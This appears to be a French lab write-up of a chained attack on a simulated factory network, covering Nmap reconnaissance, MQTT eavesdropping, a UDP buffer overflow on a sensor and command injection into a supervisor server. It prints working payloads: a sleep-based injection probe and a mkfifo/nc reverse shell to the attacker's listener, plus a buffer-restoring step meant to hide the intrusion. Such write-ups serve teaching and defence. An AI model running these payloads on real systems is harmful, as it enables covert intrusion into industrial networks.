# L'attaque

## Phase de reconnaissance

On considère que l'attaquant a accès au réseau local de l'usine (`10.42.0.0/24`).

L'utilisation de Nmap permet d'identifier l'architecture réseau et les services exposés. Le scan mixte (TCP/UDP) révèle le broker MQTT de supervision et un port d'écoute UDP atypique sur le capteur physique :

```bash
$ sudo nmap -sS -sU -p T:1883,U:3333 10.42.0.0/24
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-24 15:59 -0400
Nmap scan report for 10.42.0.33
Host is up (0.035s latency).

PORT     STATE  SERVICE
1883/tcp open   mqtt
3333/udp closed dec-notes
MAC Address: D8:3A:DD:3B:09:DB (Raspberry Pi Trading)

Nmap scan report for 10.42.0.182
Host is up (0.11s latency).

PORT     STATE         SERVICE
1883/tcp closed        mqtt
3333/udp open|filtered dec-notes
MAC Address: E4:B0:63:8A:E3:B4 (Espressif)

Nmap scan report for 10.42.0.1
Host is up (0.000052s latency).

PORT     STATE    SERVICE
1883/tcp filtered mqtt
3333/udp closed   dec-notes

Nmap done: 256 IP addresses (3 hosts up) scanned in 7.11 seconds
```

![Sortie de `nmap` sur le réseau interne](screen-nmap.png){height=350px}

Suite à cela, on peut s'abonner directement au flux de l'appareil détecté :

```bash
$ mosquitto_sub -h 10.42.0.33 -t '#' -v
capteurs/vibration {"device_id": "watch01", "vibration": 42.0}
...
```

![Sortie de `mosquitto_sub`](screen-mosquitto.png){height=350px}

## Découverte de la faille physique (*Buffer Overflow*)

L'analyse de l'équipement OT révèle un port UDP (3333) en écoute. Une technique de *Fuzzing*, consistant à envoyer des charges utiles de tailles croissantes, met en évidence une vulnérabilité de type *Buffer Overflow*. L'envoi d'une séquence dépassant 32 octets provoque un débordement écrasant la mémoire adjacente. L'interception du trafic MQTT consécutif à cette injection confirme que la variable interne `device_id`, transmise au superviseur, est corrompue et remplacée par les données arbitraires de l'attaquant.

![Capture d'écran de l'overflow, effectué par l'attaquant](screen-overflow.png){width=100%}


## Identification de la Vulnérabilité Serveur (Injection IT)

La compromission du capteur OT permet de fournir des données formatées au superviseur IT. Une analyse comportementale est menée en injectant des caractères d'échappement liés aux terminaux Linux (guillemets simples, point-virgule). L'injection de la charge utile `watch01'; sleep 10 #` provoque un gel immédiat du traitement des messages MQTT sur le serveur cible pour une durée de 10 secondes. Cette réaction temporelle confirme que le serveur d'audit exécute aveuglément les données reçues via une fonction système synchrone (type `os.system`), caractérisant ainsi une faille d'injection de commande.

On ne peut pas vraiment montrer cela avec une capture d'écran, mais il suffit d'avoir, coté attaquant :

- une fenetre qui exécute `mosquitto_sub -h 10.42.0.33 -t '#' -v`, on remarque une arrivée des messages toutes les 5 secondes
- une autre fenetre où on injecte notre commande :

  ```bash
  echo -n "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwatch01'; sleep 10 #" | nc -u -w 1 10.42.0.182 3333
  ```

- on observe un délai de 10 secondes dans les messages MQTT, et on voit le message avec le `device_id` modifié


## Exploitation Finale : Le Chained Exploit (Mouvement Latéral)

L'exploitation finale repose sur la combinaison des deux vulnérabilités afin d'exécuter un mouvement latéral depuis le réseau vers le serveur IT, tout en maintenant une furtivité totale pour masquer l'intrusion.

L'attaque est architecturée en deux phases exécutées de manière séquentielle :

1. **L'exécution de la charge (Reverse Shell) :** Création d'un tunnel réseau persistant (`mkfifo` / `nc`). Ce processus est volontairement encapsulé dans un sous-shell (`&`) pour s'exécuter en arrière-plan, évitant ainsi de bloquer l'exécution du script de supervision et de causer un déni de service.
2. **La restauration de la mémoire (Furtivité) :** L'exploitation d'un *Buffer Overflow* classique laisse la mémoire du microcontrôleur corrompue (syndrome de la "mémoire sale"). Une fois la charge exécutée, l'attaquant envoie un second paquet ciblé pour écraser le début du tampon avec l'identifiant légitime (`watch01`), suivi d'un octet nul (`\x00`). Cet octet nul agit comme un terminateur de chaîne strict en C++, forçant le firmware de la montre à ignorer le reste de la mémoire corrompue.

Un processus est mis en attente sur la machine attaquante pour réceptionner la connexion du serveur compromis :

```bash
nc -lvnp 4445
```

La commande réseau suivante déclenche l'attaque. Elle envoie le reverse shell, introduit un délai (`sleep 6`) pour garantir le traitement MQTT de la charge, puis nettoie la mémoire via l'injection du terminateur nul (`-ne` et `\x00`) :

```bash
echo -n "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwatch01'; rm -f /tmp/g; mkfifo /tmp/g; (cat /tmp/g | /bin/sh -i 2>&1 | nc 10.42.0.1 4445 >/tmp/g) & #" | nc -u -w 1 10.42.0.182 3333 && sleep 6 && echo -ne "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwatch01\x00" | nc -u -w 1 10.42.0.182 3333
```

Le terminal d'écoute confirme la réception d'une connexion entrante depuis la machine cible (`10.42.0.33`), fournissant un shell interactif avec les privilèges locaux. Parallèlement, l'observation du flux MQTT et des journaux du superviseur confirme que le système a repris instantanément la validation des trames saines émises par `watch01`. Le fonctionnement nominal de l'usine n'est pas altéré et l'accès distant est indétectable par l'opérateur métier.

![Capture d'écran de l'injection, de la sortie de superviseur et du reverse shell](screen-reverse-shell.png){width=100%}
